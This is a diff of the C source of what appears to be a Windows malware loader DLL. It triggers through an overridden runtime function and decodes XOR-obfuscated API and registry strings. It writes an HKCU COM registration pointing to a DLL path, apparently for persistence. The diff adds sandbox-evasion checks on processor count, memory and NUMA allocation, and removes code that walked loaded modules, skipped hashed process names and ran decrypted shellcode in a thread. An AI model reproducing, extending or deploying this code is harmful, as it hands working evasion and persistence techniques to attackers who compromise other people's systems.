@@ -1,65 +1,4 @@
-#include <intrin.h>
 #include <windows.h>
-
-typedef struct _MY_UNICODE_STRING {
-  USHORT Length;
-  USHORT MaximumLength;
-  WCHAR *Buffer;
-} MY_UNICODE_STRING;
-
-typedef struct _MY_PEB_LDR_DATA {
-  BYTE Reserved1[8];
-  PVOID Reserved2[3];
-  LIST_ENTRY InMemoryOrderModuleList;
-} MY_PEB_LDR_DATA;
-
-typedef struct _MY_LDR_DATA_TABLE_ENTRY {
-  LIST_ENTRY InLoadOrderLinks;
-  LIST_ENTRY InMemoryOrderLinks;
-  LIST_ENTRY InInitializationOrderLinks;
-  PVOID DllBase;
-  PVOID EntryPoint;
-  ULONG SizeOfImage;
-  MY_UNICODE_STRING FullDllName;
-  MY_UNICODE_STRING BaseDllName;
-} MY_LDR_DATA_TABLE_ENTRY;
-
-typedef struct _MY_PEB {
-  BYTE Reserved1[2];
-  BYTE BeingDebugged;
-  BYTE Reserved2[1];
-  PVOID Reserved3[2];
-  MY_PEB_LDR_DATA *Ldr;
-} MY_PEB;
-
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-#define SEC_IMAGE 0x1000000
-typedef NTSTATUS(NTAPI *pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID,
-                                          PLARGE_INTEGER, ULONG, ULONG, HANDLE);
-typedef NTSTATUS(NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR,
-                                             SIZE_T, PLARGE_INTEGER, PSIZE_T,
-                                             DWORD, ULONG, ULONG);
-typedef NTSTATUS(NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T,
-                                                 ULONG, PULONG);
-typedef HANDLE(WINAPI *pFindFirstFileW)(LPCWSTR, LPWIN32_FIND_DATAW);
-typedef BOOL(WINAPI *pFindNextFileW)(HANDLE, LPWIN32_FIND_DATAW);
-typedef BOOL(WINAPI *pFindClose)(HANDLE);
-typedef UINT(WINAPI *pGetSystemDirectoryW)(LPWSTR, UINT);
-typedef HANDLE(WINAPI *pCreateFileW)(LPCWSTR, DWORD, DWORD,
-                                     LPSECURITY_ATTRIBUTES, DWORD, DWORD,
-                                     HANDLE);
-typedef BOOL(WINAPI *pCloseHandle)(HANDLE);
-typedef HANDLE(WINAPI *pGetCurrentProcess)(void);
-typedef void(WINAPI *pSleep)(DWORD);
-typedef HANDLE(WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
-                                      LPTHREAD_START_ROUTINE, LPVOID, DWORD,
-                                      LPDWORD);
-typedef DWORD(WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
-typedef LPVOID(WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
-typedef BOOL(WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
-
-extern unsigned char _binary_enc_shellcode_bin_start[];
-extern unsigned char _binary_enc_shellcode_bin_end[];
 
 void ___chkstk_ms(void) { return; }
 
@@ -115,100 +54,7 @@ int memcmp(const void *s1, const void *s2, size_t count) {
   return 0;
 }
 
-static int w2l_a(const WCHAR *src, char *dst, int max) {
-  int i = 0;
-  while (src[i] && i < max - 1) {
-    WCHAR c = src[i];
-    if (c >= 'A' && c <= 'Z')
-      c += 32;
-    dst[i] = (char)c;
-    i++;
-  }
-  dst[i] = 0;
-  return i;
-}
-
-static unsigned int fnv1a(const char *s) {
-  unsigned int h = 0x811c9dc5U;
-  while (*s) {
-    unsigned char c = (unsigned char)*s++;
-    if (c >= 'A' && c <= 'Z')
-      c += 32;
-    h ^= c;
-    h *= 0x01000193U;
-  }
-  return h;
-}
-
-#define EXCL_COUNT 25
-static int is_excluded(const char *name) {
-  static const unsigned int exc_hashes[EXCL_COUNT] = {
-      0x39794115U, 0x8A464819U, 0x96C0ADB4U, 0xF18B972FU, 0xFC84966AU,
-      0xA3E6F6C3U, 0xBD6D9917U, 0x51D79D77U, 0xA62A3B3BU, 0x174C966EU,
-      0xBB40E468U, 0x8EC4C73BU, 0xC0323159U, 0xEF148EF1U, 0x8F8E7D23U,
-      0xF612CD43U, 0xEA6423E3U, 0xF6BDBD88U, 0x1C626FB1U, 0xFA102E29U,
-      0x8B4D9112U, 0xCC3C0247U, 0x36E1BF09U, 0xF12937A6U, 0xE6CF3F46U,
-  };
-  unsigned int h = fnv1a(name);
-  int i;
-  for (i = 0; i < EXCL_COUNT; i++) {
-    if (h == exc_hashes[i])
-      return 1;
-  }
-  return 0;
-}
-
 static int triggered = 0;
-
-static struct {
-  void *a;
-  pSleep s;
-} g_tc;
-
-static DWORD WINAPI _sc_thd(LPVOID p) {
-  ((void (*)(void))g_tc.a)();
-  return 0;
-}
-
-static int is_dll_loaded(const WCHAR *name, MY_PEB *peb) {
-  MY_PEB_LDR_DATA *ldr = peb->Ldr;
-  LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
-  LIST_ENTRY *entry = head->Flink;
-  while (entry != head) {
-    MY_LDR_DATA_TABLE_ENTRY *mod =
-        (MY_LDR_DATA_TABLE_ENTRY *)((BYTE *)entry - sizeof(LIST_ENTRY));
-    if (mod->BaseDllName.Buffer && mod->BaseDllName.Length > 0) {
-      WCHAR *a = mod->BaseDllName.Buffer;
-      const WCHAR *b = name;
-      int match = 1;
-      while (*a && *b) {
-        WCHAR ca = *a, cb = *b;
-        if (ca >= 'A' && ca <= 'Z')
-          ca += 32;
-        if (cb >= 'A' && cb <= 'Z')
-          cb += 32;
-        if (ca != cb) {
-          match = 0;
-          break;
-        }
-        a++;
-        b++;
-      }
-      if (match && *a == 0 && *b == 0)
-        return 1;
-    }
-    entry = entry->Flink;
-  }
-  return 0;
-}
-
-static int is_excluded_w(const WCHAR *name) {
-  char ascii[256];
-  w2l_a(name, ascii, 256);
-  int r = is_excluded(ascii);
-  memset(ascii, 0, 256);
-  return r;
-}
 
 static unsigned char ck2[] = "9832gf2bc29_120e9hd10c))b@@!11";
 static unsigned int ck2l = 30;
@@ -252,17 +98,30 @@ static FARPROC ra(HMODULE mod, unsigned char *enc, int len) {
 
 #include "payloads.h"
 
-unsigned long long __cdecl strlen(const char *s) {
-  unsigned long long l = 0;
-  while (s[l])
-    l++;
-  return l;
-}
-
 void *_set_se_translator(void *translator) {
   if (triggered)
     return (void *)0;
   triggered = 1;
+
+  SYSTEM_INFO sysinfo;
+  GetSystemInfo(&sysinfo);
+  if (sysinfo.dwNumberOfProcessors < 2) {
+    return (void *)0;
+  }
+
+  MEMORYSTATUSEX memStat;
+  memStat.dwLength = sizeof(MEMORYSTATUSEX);
+  GlobalMemoryStatusEx(&memStat);
+  if (memStat.ullTotalPhys < 2147483648ULL) {
+    return (void *)0;
+  }
+
+  LPVOID mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 0x1000,
+                                  MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0);
+  if (mem == NULL) {
+    return (void *)0;
+  }
+  VirtualFreeEx(GetCurrentProcess(), mem, 0, MEM_RELEASE);
 
   unsigned char e_kernel32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
                                 0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};
@@ -369,13 +228,21 @@ void *_set_se_translator(void *translator) {
     fCloseHandle(hFile);
   }
 
-  unsigned char e_reg_key[] = {0x6a, 0x57, 0x55, 0x46, 0x10, 0x07, 0x40, 0x07, 0x3f, 0x71, 0x55, 0x3e, 0x42, 0x41, 0x55, 0x16, 0x65, 0x2b, 0x28, 0x62, 0x79, 0x27, 0x75, 0x52, 0x26, 0x79, 0x71, 0x15, 0x05, 0x75, 0x7a, 0x7c, 0x1e, 0x77, 0x5e, 0x5f, 0x0a, 0x4f, 0x57, 0x77, 0x7a, 0x1e, 0x1c, 0x73, 0x72, 0x53, 0x78, 0x45, 0x20, 0x72, 0x74, 0x5b, 0x1a, 0x6a, 0x21, 0x02, 0x01, 0x10, 0x07, 0x75, 0x44, 0x64, 0x7a, 0x5c, 0x37, 0x14, 0x5d, 0x01, 0x30, 0x57, 0x4b, 0x29, 0x54, 0x40, 0x03, 0x57, 0x39};
+  unsigned char e_reg_key[] = {
+      0x6a, 0x57, 0x55, 0x46, 0x10, 0x07, 0x40, 0x07, 0x3f, 0x71, 0x55,
+      0x3e, 0x42, 0x41, 0x55, 0x16, 0x65, 0x2b, 0x28, 0x62, 0x79, 0x27,
+      0x75, 0x52, 0x26, 0x79, 0x71, 0x15, 0x05, 0x75, 0x7a, 0x7c, 0x1e,
+      0x77, 0x5e, 0x5f, 0x0a, 0x4f, 0x57, 0x77, 0x7a, 0x1e, 0x1c, 0x73,
+      0x72, 0x53, 0x78, 0x45, 0x20, 0x72, 0x74, 0x5b, 0x1a, 0x6a, 0x21,
+      0x02, 0x01, 0x10, 0x07, 0x75, 0x44, 0x64, 0x7a, 0x5c, 0x37, 0x14,
+      0x5d, 0x01, 0x30, 0x57, 0x4b, 0x29, 0x54, 0x40, 0x03, 0x57, 0x39};
   char reg_key[256];
   xd(e_reg_key, reg_key, 77);
 
   HKEY hKey;
-  if (RegCreateKeyExA(HKEY_CURRENT_USER, reg_key, 0, NULL, REG_OPTION_NON_VOLATILE,
-                      KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+  if (RegCreateKeyExA(HKEY_CURRENT_USER, reg_key, 0, NULL,
+                      REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey,
+                      NULL) == ERROR_SUCCESS) {
     unsigned char e_ThreadingModel[] = {0x6d, 0x50, 0x41, 0x57, 0x06,
                                         0x02, 0x5b, 0x0c, 0x04, 0x7f,
                                         0x56, 0x3b, 0x54, 0x5e, 0x30};
@@ -388,7 +255,8 @@ void *_set_se_translator(void *translator) {
     xd(e_Apartment, Apartment, 10);
 
     RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE *)dll_path, 40);
-    RegSetValueExA(hKey, ThreadingModel, 0, REG_SZ, (const BYTE *)Apartment, 11);
+    RegSetValueExA(hKey, ThreadingModel, 0, REG_SZ, (const BYTE *)Apartment,
+                   11);
     RegCloseKey(hKey);
   }
 
